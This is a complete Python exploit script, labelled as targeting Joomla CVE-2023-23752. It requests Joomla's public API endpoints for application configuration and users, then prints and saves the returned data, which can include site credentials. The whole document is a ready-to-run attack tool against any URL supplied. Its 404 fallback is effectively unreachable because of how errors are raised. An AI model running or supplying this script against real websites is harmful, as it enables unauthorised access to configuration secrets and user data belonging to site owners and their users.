import requests
import json
import argparse
from rich import print_json

def send_request(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'}
        response1 = requests.get(url+"api/index.php/v1/config/application?public=true")
        response1.raise_for_status()  # Raise an HTTPError for bad responses
        if response1.status_code == 404:
            response2 = requests.get(url + '/api/index.php/v1/users?public=true')
            response2.raise_for_status()
            return response2.text
        else:
            response1.raise_for_status()
            return response1.text
    except requests.RequestException as e:
        print(f"Error in sending request: {e}")
        return None

def write_to_file(data, file_path):
    try:
        with open(file_path, 'a') as file:
            file.write(data + '\n')
        print(f"Data written to {file_path}")
    except IOError as e:
        print(f"Error writing to file: {e}")

def request_sender(url, output_file=None):
    data = send_request(url)
    if data is not None:
        data_dump = json.loads(data)
        print_json(json.dumps(data_dump, indent=1))
        if output_file:
            write_to_file(json.dumps(data_dump), output_file)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Joomla CVE-2023-23752 exploit")
    parser.add_argument("-u", "--url", required=True, help="Target URL with a trailing slash")
    parser.add_argument("-o", "--output-file", help="File to write the output to")
    args = parser.parse_args()

    request_sender(args.url, args.output_file)

